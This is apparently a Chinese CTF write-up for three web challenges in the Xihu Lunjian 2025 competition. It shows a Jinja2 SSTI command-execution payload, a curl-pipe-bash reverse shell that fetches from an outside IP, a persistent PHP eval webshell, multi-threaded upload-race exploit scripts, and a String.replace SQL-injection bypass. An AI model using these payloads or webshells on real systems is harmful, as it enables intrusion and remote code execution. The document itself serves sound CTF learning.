+++
title = "西湖论剑2025(AK)"
slug = "xihu-lungjian-2025-ak"
description = "感觉最后一题是运气题"
date = "2025-01-18T11:07:55"
lastmod = "2025-01-18T11:07:55"
image = ""
license = ""
categories = ["赛题"]
tags = ["ssti", "nodejs", "php"]
+++

#  0x01 说在前面

第一次大比赛AK，但是这个竞争，你不会加延时，你知道我竞争了多久吗

# 0x02 question

## Rank-l

简单测出来是一个ssti，然后过滤的也很少，直接打，~~说的轻松打的也不是很难~~

```
{{url_for.__globals__['__builtins__'].__import__('os').popen(request.args.x1).read()}}
```

然后就可以执行命令了

```http
POST /cpass?x1=ls+/ HTTP/1.1
Host: 139.155.126.78:15661
Content-Length: 15
Cache-Control: max-age=0
Origin: http://139.155.126.78:15661
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://139.155.126.78:15661/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=iua127iuofecbllp3f56gtg3qb
Connection: close

password=123456
```

然后反弹shell

```
curl+http://156.238.233.9/shell.sh|bash
```

直接在根目录进行`tac`，交中间的值，我交半天绷不住了，还有失误的地方就是，`x1`参数我一直在`login`的地方写导致不能过

## Rank-U

进来就是一个很简单的页面，貌似是要爆破验证码了，有两种情况一种是一直爆，直到302，或者是直接爆破出正确密码，其中可以很简单的看出来验证码是不变的，只要不刷新验证码就不会变

```
admin\year2000
```

测试了很久，不能跨目录，不能上传php，只能上传图片，且版本如下

```
Apache/2.4.38 (Debian)
PHP/7.3.28
```

但是没有什么用，直接写不死马，开条件竞争

```http
POST /admin/index.php HTTP/1.1
Host: 139.155.126.78:26051
Content-Length: 287
Cache-Control: max-age=0
Origin: http://139.155.126.78:26051
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9BcALzlEz2ZpVOGZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://139.155.126.78:26051/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=iua127iuofecbllp3f56gtg3qb
Connection: close

------WebKitFormBoundary9BcALzlEz2ZpVOGZ
Content-Disposition: form-data; name="file_upload"; filename="1.php"
Content-Type: application/png

<?php

while(1){
file_put_contents("a.php","<?php @eval(\$_REQUEST[1]);?>");
};
?>
------WebKitFormBoundary9BcALzlEz2ZpVOGZ--

```

bp线程开大点，一直上传就完事了，然后用脚本遍历目录，但是这种情况下，成功概率极低，我后面想着直接所有操作都使用脚本进行

```python
import io
import re
import requests
import threading

# 定义目标 URL 和正则表达式
up_url = 'http://139.155.126.78:27102/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/'
php_idx = '1f14bba00da3b75118bc8dbf8625f7d0/(.*?)\\.php</'
payload = '''<?php
phpinfo();
ignore_user_abort(true);
set_time_limit(0);
$file = 'shell.php';
$code = '<?php @eval($_POST[1]);?>';
while (1) {
    file_put_contents($file, $code);
}
?>'''
p = io.StringIO(payload)


# 定义任务函数
def fetch_and_process():
    while True:
        try:
            # 获取页面内容
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Cache-Control": "max-age=0",
                "Cookie": "PHPSESSID=keub5bch0acvude4bsikfa2m9k",
                "Host": "139.155.126.78:27102",
                "Origin": "http://139.155.126.78:28385",
                "Referer": "http://139.155.126.78:28385/admin/index.php",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
            }

            # you should modify File content and Content-Type by yourself
            files = {"file_upload": ("s.php", p, "image/png")}
            url = "http://139.155.126.78:27102/admin/index.php"
            res = requests.post(url=url, headers=headers, files=files, verify=False)
            shell_path = re.findall(php_idx, res.text)
            # 访问提取的 PHP 文件

            print(requests.get(f'{up_url}{shell_path[0]}.php').text)
            print(f'{up_url}{shell_path[0]}.php')
            for i in range(10):
                print(requests.get(f'{up_url}{shell_path[0]}.php').text)
        except:
            pass


# 启动多线程
num_threads = 50
threads = []

for _ in range(num_threads):
    thread = threading.Thread(target=fetch_and_process)
    thread.daemon = True  # 设置为守护线程
    threads.append(thread)
    thread.start()

# 保持主线程运行
for thread in threads:
    thread.join()
```

然后访问`http://139.155.126.78:26051/admin/Uploads/`，就可以有`a.php`的webshell了

```
?1=readfile("/flag")
```

真的很讲运气，还有一种解法后面了解到是可以利用正则直接竞争出来文件名，拿到flag

```python

import requests
import re
import time
from multiprocessing import Process

burp0_url = "http://139.155.126.78:16004/admin/index.php"
burp0_cookies = {"PHPSESSID": "iua127iuofecbllp3f56gtg3qb"}
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Origin": "http://139.155.126.78:16004",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryt2b9EtsFNrTXH9Tl",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://139.155.126.78:16004/admin/index.php",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close"
}
burp0_data = """------WebKitFormBoundaryt2b9EtsFNrTXH9Tl\r\nContent-Disposition: form-data; name="file_upload"; filename="1.php"\r\nContent-Type: text/php\r\n\r\n<?php\nreadfile("/flag");\n?>\r\n------WebKitFormBoundaryt2b9EtsFNrTXH9Tl--\r\n"""


# 从响应中提取上传后的文件路径
def extract_uploaded_file(response_text):
    # 正则表达式匹配上传后的文件路径
    match = re.search(r'文件已保存为:\s*(.*?)(?=\s*</p>)', response_text)
    if match:
        return match.group(1)
    return None


# 尝试上传文件并访问它
def upload_and_access_file():
    while True:
        try:
            # 上传文件
            from time import time
            import hashlib
            # print(hashlib.md5())
            response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,
                                     timeout=5,proxies={"http":"127.0.0.1:8080"})
            if response.status_code == 200:
                print("File uploaded successfully, parsing response to find the file path...")

                # 提取上传后的文件路径
                file_path = extract_uploaded_file(response.text)
                print(file_path)
                if file_path:
                    # 完整的文件访问路径
                    file_url = f"http://139.155.126.78:16004/admin/{file_path[1:]}"
                    print(f"File uploaded to: {file_url}")

                    try:
                        # 立即访问文件
                        access_response = requests.get(file_url, timeout=5,proxies={"http":"127.0.0.1:8080"})
                        if access_response.status_code == 200:
                            print("Successfully accessed the file!")
                            print("File Content:\n", access_response.text)
                            exit()
                        else:
                            print(f"Failed to access the file, status code: {access_response.status_code}")
                    except requests.exceptions.RequestException as e:
                        print(f"Error accessing the file: {e}")
                else:
                    print("Failed to find the uploaded file path in the response.")
            else:
                print(f"File upload failed, status code: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"Error uploading file: {e}")



# 创建并启动多个进程
def start_processes(num_processes=10):
    processes = []
    for _ in range(num_processes):
        process = Process(target=upload_and_access_file)
        processes.append(process)
        process.start()

    # 等待所有进程完成
    for process in processes:
        process.join()


if __name__ == "__main__":
    start_processes(50)  # 启动 10 个进程来并行执行上传和访问任务
```

至于写的IP为啥不一样，我开了几个靶机你知道嘛😭

## sqli or not

```js

var express = require('express');
var router = express.Router();
module.exports = router;

router.get('/',(req,res,next)=>{
    if(req.query.info){
        if(req.url.match(/\,/ig)){
            res.end('hacker1!');
        }
        var info = JSON.parse(req.query.info);
        if(info.username&&info.password){
            var username = info.username;
            var password = info.password;
            if(info.username.match(/\'|\"|\\/) || info.password.match(/\'|\"|\\/)){
                res.end('hacker2!');
            }
            var sql = "select * from userinfo where username = '{username}' and password = '{password}'";
            sql = sql.replace("{username}",username);
            sql = sql.replace("{password}",password);
            connection.query(sql,function (err,rs) {
            if (err) {
                res.end('error1');
            }
            else {
                if(rs.length>0){
                res.sendFile('/flag');
                }else {
                res.end('username or password error');
                }
            }
            })
        }
        else{
            res.end("please input the data");
        }
       
}
    else{
        res.end("please input the data");
    }
})
```

找到了源码一看就是sql注入，这里需要绕过`'`，`sql.replace`后面找到了文章[poc关键点](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)  [关键词分析](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext)

可以利用这个

```
$`
```

获取左边的匹配项，也就是单引号

```
/?info={"username":"$`||1%23"%2c"password":"1"}
```

拿到`flag`
